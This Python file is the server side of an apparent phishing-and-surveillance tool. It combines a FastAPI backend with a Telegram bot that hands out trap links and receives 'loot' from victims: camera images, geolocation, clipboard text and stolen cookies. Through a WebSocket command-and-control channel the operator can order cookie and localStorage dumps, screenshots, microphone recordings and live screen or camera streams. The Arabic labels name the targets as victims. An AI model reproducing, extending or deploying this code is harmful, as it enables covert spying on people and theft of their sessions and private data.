import os
import uuid
import asyncio
import base64
from datetime import date
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile, LabeledPrice

from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, USERS_DB, VICTIMS_DB, ACTIVE_WEBSOCKETS, COMMAND_QUEUES
from templates import get_intel_template, get_live_template

app = FastAPI()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    network_info: dict = {}
    clipboard_text: str = ""
    stolen_cookies: str = ""
    stolen_data: dict = {}

class CommandResponse(BaseModel):
    link_id: str
    cmd: str
    data: str

@app.get("/intel/{link_id}", response_class=HTMLResponse)
async def serve_intel_trap(link_id: str, request: Request):
    return HTMLResponse(content=get_intel_template(link_id))

@app.get("/live/{link_id}", response_class=HTMLResponse)
async def serve_live_trap(link_id: str, request: Request):
    return HTMLResponse(content=get_live_template(link_id))

@app.websocket("/ws/c2/{link_id}")
async def websocket_endpoint(websocket: WebSocket, link_id: str):
    await websocket.accept()
    ACTIVE_WEBSOCKETS[link_id] = websocket
    target_user_id = LINK_TO_USER.get(link_id)
    
    if target_user_id:
        try:
            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[تم اصطياد الضحية بنجاح]*\n🔑 الجلسة: `{link_id}`", parse_mode="Markdown")
        except:
            pass

    try:
        while True:
            data = await websocket.receive_text()
            import json
            packet = json.loads(data)
            if packet.get("type") == "response":
                await handle_response_packet(packet)
            await asyncio.sleep(2)
            if link_id in ACTIVE_WEBSOCKETS:
                await websocket.send_json({"cmd": "ping"})
    except WebSocketDisconnect:
        ACTIVE_WEBSOCKETS.pop(link_id, None)
    except Exception:
        ACTIVE_WEBSOCKETS.pop(link_id, None)

async def handle_response_packet(packet: dict):
    link_id = packet.get("link_id")
    cmd_type = packet.get("cmd")
    res_data = packet.get("data", "")
    target_user_id = LINK_TO_USER.get(link_id)
    
    if target_user_id:
        try:
            if cmd_type == "screen_snapshot" and "," in str(res_data):
                _, encoded = res_data.split(",", 1)
                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="real_screen.jpg"), caption="📸 *لقطة شاشة حقيقية من جهاز الضحية*", parse_mode="Markdown")
            elif (cmd_type == "live_screen_frame" or cmd_type == "live_camera_frame") and "," in str(res_data):
                _, encoded = res_data.split(",", 1)
                stream_title = "🔴 *بث حي حقيقي للشاشة*" if cmd_type == "live_screen_frame" else "📹 *بث حي للكاميرا*"
                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="frame.jpg"), caption=stream_title, parse_mode="Markdown")
            elif cmd_type == "audio_clip" and "," in str(res_data):
                _, encoded = res_data.split(",", 1)
                await bot.send_voice(chat_id=target_user_id, voice=BufferedInputFile(base64.b64decode(encoded), filename="mic.ogg"), caption="🎤 *تسجيل صوتي منفصل من الميكروفون*", parse_mode="Markdown")
            else:
                await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة أمر: {cmd_type}]*\n\n`{str(res_data)[:1000]}`", parse_mode="Markdown")
        except Exception as e:
            print(f"Delivery Error: {e}")

@app.post("/api/v1/c2-respond")
async def c2_respond_fallback(resp: CommandResponse):
    await handle_response_packet(resp.dict())
    return {"status": "ok"}

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            caption = (
                "⚡ *[تم تسجيل بيانات الضحية بنجاح!]*\n\n"
                f"💻 *النظام:* `{data.device_info}`\n"
                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`"
            )
            kb_control = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
                    InlineKeyboardButton(text="📦 سحب LocalStorage", callback_data=f"cmd_ls_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📸 لقطة شاشة", callback_data=f"cmd_snap_{data.link_id}"),
                    InlineKeyboardButton(text="🎤 تسجيل صوتي", callback_data=f"cmd_mic_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="🔴 شاشة لايف", callback_data=f"cmd_lscr_{data.link_id}"),
                    InlineKeyboardButton(text="⏹️ إيقاف اللايف", callback_data=f"cmd_stopscr_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📹 كاميرا لايف", callback_data=f"cmd_lcam_{data.link_id}"),
                    InlineKeyboardButton(text="📋 سحب الحافظة", callback_data=f"cmd_clip_{data.link_id}")
                ]
            ])
            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                _, encoded = data.camera_snapshot_base64.split(",", 1)
                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="target.jpg"), caption=caption, parse_mode="Markdown", reply_markup=kb_control)
            else:
                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
        except Exception as e:
            print(f"Error: {e}")
    return {"status": "success"}

@dp.callback_query(lambda c: c.data and c.data.startswith("cmd_"))
async def process_live_commands(callback: types.CallbackQuery):
    data_parts = callback.data.split("_")
    action = data_parts[1]
    link_id = data_parts[2] if action != "stopscr" else data_parts[2]
    
    cmd_map = {
        "cookie": "dump_cookies",
        "ls": "dump_localstorage",
        "snap": "screen_snapshot",
        "mic": "record_audio",
        "clip": "dump_clipboard",
        "lscr": "start_live_screen",
        "stopscr": "stop_live_screen",
        "lcam": "start_live_camera"
    }
    target_cmd = cmd_map.get(action)
    if not target_cmd:
        await callback.answer("❌ أمر غير معروف.", show_alert=True)
        return

    ws = ACTIVE_WEBSOCKETS.get(link_id)
    if ws:
        await ws.send_json({"cmd": target_cmd})
    await callback.answer("🚀 تم إرسال الأمر وتوجيه الأداة بشكل مستقل...", show_alert=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔍 أداة الاستخبارات الأولية"), KeyboardButton(text="⚡ أداة التحكم C2 العسكري المنفصل")],
            [KeyboardButton(text="📊 الإحصائيات")]
        ],
        resize_keyboard=True
    )
    await message.answer("💀 *منصة الترسانة السيبرانية مهيكلة ومنفصلة بالكامل.*\n• كل أداة تعمل بشكل مستقل وبأقصى دقة.", reply_markup=kb, parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "🔍 أداة الاستخبارات الأولية")
async def gen_intel(message: types.Message):
    token = str(uuid.uuid4())[:8]
    LINK_TO_USER[token] = message.from_user.id
    url = f"https://{DOMAIN}/intel/{token}"
    await message.answer(f"✅ *رابط الاستخبارات:* \n`{url}`", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "⚡ أداة التحكم C2 العسكري المنفصل")
async def gen_live(message: types.Message):
    token = str(uuid.uuid4())[:8]
    LINK_TO_USER[token] = message.from_user.id
    url = f"https://{DOMAIN}/live/{token}"
    await message.answer(f"✅ *رابط C2 العسكري:* \n`{url}`", parse_mode="Markdown")

async def run_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup():
    asyncio.create_task(run_polling())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
